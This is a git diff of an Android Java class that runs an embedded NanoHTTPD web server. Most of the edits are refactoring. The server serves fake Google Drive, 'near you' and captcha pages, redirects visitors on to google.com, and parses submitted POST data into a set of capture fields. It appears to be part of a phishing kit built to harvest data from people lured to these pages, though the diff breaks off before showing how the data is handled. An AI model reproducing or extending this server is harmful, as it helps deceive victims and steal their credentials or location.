@@ -1,56 +1,45 @@
 package com.cyberfreak.cardviewtesting;
 
-import static java.security.AccessController.getContext;
+import static fi.iki.elonen.NanoHTTPD.newChunkedResponse;
+import static fi.iki.elonen.SimpleWebServer.newFixedLengthResponse;
 
+import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
-import android.os.Environment;
-import android.util.Log;
 
-import org.json.JSONObject;
-import org.json.JSONException;
+import androidx.appcompat.app.AppCompatActivity;
 
-import java.io.BufferedReader;
-import java.io.BufferedWriter;
-import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
-import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
 import java.util.Map;
 
 import fi.iki.elonen.NanoHTTPD;
-import java.io.BufferedReader;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.InputStreamReader;
-public class MyHTTPD extends NanoHTTPD {
 
-    String postData=null,postData1 = null,postData2=null,postData3=null,postData4=null,postData5=null,postData6=null,postData7=null,postData8=null;
-    private final Context context;
+import java.io.File;
+public class MyHTTPD extends NanoHTTPD {
     public MyHTTPD(int port,Context context) {
         super(port);
-        this.context=context;
+        this.context = context;
     }
+    private final Context context;
+    String postData=null,postData1 = null,postData2=null,postData3=null,postData4=null,postData5=null,postData6=null,postData7=null,postData8=null;
 
-    @Override
-    public Response serve(IHTTPSession session) {
+   @Override
+    public NanoHTTPD.Response serve(NanoHTTPD.IHTTPSession session) {
         // Get the URI o"f the requested page
         String uri = session.getUri();
-        if (session.getMethod() == Method.GET) {
+        if (session.getMethod() == NanoHTTPD.Method.GET) {
             if (uri.equals("/gdrive")) {
                 String name = "/assets/static/googledrive/index1.html";
                 InputStream inputStream = getClass().getResourceAsStream(name);
-                return newChunkedResponse(Response.Status.OK, "text/html", inputStream);
+                return newChunkedResponse(NanoHTTPD.Response.Status.OK, "text/html", inputStream);
             }
             if (uri.equals("/real_url")) {
                 // Perform the redirect
-                Response response = newFixedLengthResponse(Response.Status.REDIRECT, NanoHTTPD.MIME_PLAINTEXT, "");
+                NanoHTTPD.Response response = newFixedLengthResponse(NanoHTTPD.Response.Status.REDIRECT, NanoHTTPD.MIME_PLAINTEXT, "");
                 response.addHeader("Location", "https://google.com");
                 return response;
             }
@@ -58,41 +47,41 @@ public class MyHTTPD extends NanoHTTPD {
                 if (uri.equals("/nearyou")) {
                 String name = "/assets/static/nearyou/index2.html";
                 InputStream inputStream = getClass().getResourceAsStream(name);
-                return newChunkedResponse(Response.Status.OK, "text/html", inputStream);
+                return newChunkedResponse(NanoHTTPD.Response.Status.OK, "text/html", inputStream);
             }
             if (uri.equals("/captcha")) {
                 String name = "/assets/static/captcha/index3.html";
                 InputStream inputStream = getClass().getResourceAsStream(name);
-                return newChunkedResponse(Response.Status.OK, "text/html", inputStream);
+                return newChunkedResponse(NanoHTTPD.Response.Status.OK, "text/html", inputStream);
             }
 
             if (uri.startsWith("/static/nearyou")) {
                 String filePath = uri.substring("/static/nearyou".length());
                 InputStream inputStream = getClass().getResourceAsStream("/assets/static/nearyou" + filePath);
                 String mimeType = getMimeType(filePath);
-                return newChunkedResponse(Response.Status.OK, mimeType, inputStream);
+                return newChunkedResponse(NanoHTTPD.Response.Status.OK, mimeType, inputStream);
             }
             if (uri.startsWith("/static/googledrive")) {
                 String filePath = uri.substring("/static/googledrive".length());
                 InputStream inputStream = getClass().getResourceAsStream("/assets/static/googledrive" + filePath);
                 String mimeType = getMimeType(filePath);
-                return newChunkedResponse(Response.Status.OK, mimeType, inputStream);
+                return newChunkedResponse(NanoHTTPD.Response.Status.OK, mimeType, inputStream);
             }
             if (uri.startsWith("/static/captcha")) {
                 String filePath = uri.substring("/static/captcha".length());
                 InputStream inputStream = getClass().getResourceAsStream("/assets/static/captcha" + filePath);
                 String mimeType = getMimeType(filePath);
-                return newChunkedResponse(Response.Status.OK, mimeType, inputStream);
+                return newChunkedResponse(NanoHTTPD.Response.Status.OK, mimeType, inputStream);
             }
             // If the URI is not recognized, return a 404 Not Found response
-            return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "404 Error");
+            return newFixedLengthResponse(NanoHTTPD.Response.Status.NOT_FOUND, "text/plain", "404 Error");
         }
-        if (session.getMethod() == Method.POST) {
+        if (session.getMethod() == NanoHTTPD.Method.POST) {
             // Get the POST data from the request
             Map<String, String> params = new HashMap<String, String>();
             try {
                 session.parseBody(params);
-            } catch (IOException | ResponseException e) {
+            } catch (IOException | NanoHTTPD.ResponseException e) {
                 e.printStackTrace();
             }
 
